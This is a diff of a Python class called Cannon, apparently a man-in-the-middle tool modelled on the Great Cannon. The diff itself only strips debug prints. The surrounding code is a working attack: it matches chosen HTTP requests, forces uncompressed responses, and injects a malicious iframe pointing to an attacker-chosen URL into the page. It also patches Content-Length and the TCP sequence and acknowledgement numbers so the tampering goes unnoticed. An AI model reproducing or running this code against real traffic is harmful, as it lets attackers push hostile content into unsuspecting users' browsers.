@@ -25,12 +25,7 @@ class Cannon(object):
 	if (ip_packet.protocol == 6 and http_packet): # assure the ip protocol is tcp
             # RESPONSES
             if self.req_dict[ip_packet.srcip][ip_packet.payload.dstport] or ip_packet.payload.dstport in self.ip_port[ip_packet.srcip]:
-                print "FOUND RESPONSE"
-                print "offsets", self.req_dict[ip_packet.srcip][ip_packet.payload.dstport], self.resp_dict[ip_packet.srcip][ip_payload.dstport]
-                #print "Response ACK", ip_packet.payload.ack
-                #print "Response SEQ", ip_packet.payload.seq, "\n"
-                '''ip_packet.payload.ack = ip_packet.payload.ack - self.req_dict[ip_packet.srcip]
-                ip_packet.payload.seq = ip_packet.payload.seq + self.resp_dict[ip_packet.dstip]'''
+
                 og_len = len(http_packet)
                 new_http = self.reform_resp(http_packet, ip_packet.dstip) # reform
  
@@ -40,42 +35,35 @@ class Cannon(object):
                 ip_packet.payload.ack = ip_packet.payload.ack - self.req_dict[ip_packet.srcip][ip_packet.payload.dstport] # Changing seq and ack
                 ip_packet.payload.seq = ip_packet.payload.seq + self.resp_dict[ip_packet.srcip][ip_packet.payload.dstport]
                 self.resp_dict[ip_packet.srcip][ip_packet.payload.dstport]+= len(new_http) - og_len
-                #print "Response ACK_Mod", ip_packet.payload.ack
-                #print "Response SEQ_Mod", ip_packet.payload.seq, "\n-----------------------------------\n"
+
             # REQUESTS
             else:
                 # Attain domain and URL
                 path,dom = self.extract_url(http_packet)
-                #print path
-                # print dom
+
                 if path and dom: # ie the packet is not a response
                     path_match,dom_match = self.is_cand(path,dom)
                     if path_match and dom_match:
-                        print "Candidate Request" 
-                        #print "Request ACK", ip_packet.payload.ack
-                        #print "Request SEQ", ip_packet.payload.seq, "\n"
+
                         og_len = len(http_packet)
                         new_http = self.reform_req(ip_packet, ip_packet.dstip)
                         ip_packet.payload.payload = ip_packet.payload.payload.replace(ip_packet.payload.payload, new_http) 
                         ip_packet.payload.hdr(new_http)
                         ip_packet.hdr(ip_packet.payload) 
                         if self.resp_dict[ip_packet.dstip][ip_packet.payload.srcport] or ip_packet.payload.srcport in self.ip_port[ip_packet.dstip]:
-                            print "offsets", self.req_dict[ip_packet.dstip][ip_packet.payload.srcport], self.resp_dict[ip_packet.dstip][ip_payload.srcport]
+  
                             ip_packet.payload.ack = ip_packet.payload.ack - self.resp_dict[ip_packet.dstip][ip_packet.payload.srcport]
                             ip_packet.payload.seq = ip_packet.payload.seq + self.req_dict[ip_packet.dstip][ip_packet.payload.srcport]
                         self.req_dict[ip_packet.dstip][ip_packet.payload.srcport]+= len(new_http) - og_len
-                        #print "Request ACK_Mod", ip_packet.payload.ack
-                        #print "Request SEQ_Mod", ip_packet.payload.seq, "\n-----------------------------------\n"
         return ip_packet
 
     def extract_url(self,packet):
-        # print "application_packet = ", packet FOR DEBUG
         path = []
         dom = []
         parsed = 0
         for i in range(len(packet)):
             if parsed: break 
-            #print "packet[i:i+4]: ", packet[i:i+4]
+		
             if packet[i:i+4] == "GET ": 
                 for j in range(i+4, len(packet)):
                     if packet[j] == " ":
@@ -93,8 +81,7 @@ class Cannon(object):
         c_path = []
         c_dom = []
         if path and dom: 
-            #print "path = ", path
-            #print "dom = ", dom
+
             if path[-1] == "/":
                 c_path = path[0:-1]
             else:
@@ -121,7 +108,6 @@ class Cannon(object):
                 for j in range(i+17, len(packet)):
                     if packet[j] == "\r" and packet[j+1] == "\n":                        
                         diff = j - i - 25 # j - length of Accept-Encoding: identity
-                        # print "difference", diff 
                         new_req.append("\r\n")    
                         i = j + 1
                         break                    
@@ -142,8 +128,6 @@ class Cannon(object):
                     orig_len.append(packet[k])
                 # print ''.join(orig_len)
                 new_length = int(''.join(orig_len)) + 24 + len(self.iframe_url)
-                #cl_offset = len(str(new_length)) - len(orig_len)
-                #self.resp_dict[dstip] += cl_offset
                 new_resp.append(("ontent-Length: " + str(new_length) + "\r\n"))
                 for j in range(i, len(packet)):
                     if packet[j] == "\r" and packet[j+1] == "\n":
@@ -154,7 +138,6 @@ class Cannon(object):
                 mal_str = '<iframe src="' + self.iframe_url + '"></iframe>'
                 new_resp.append(mal_str)
                 new_resp.append('<') 
-                #self.resp_dict[dstip]+= 24 + len(self.iframe_url) 
             i+=1
         return ''.join(new_resp)        
 
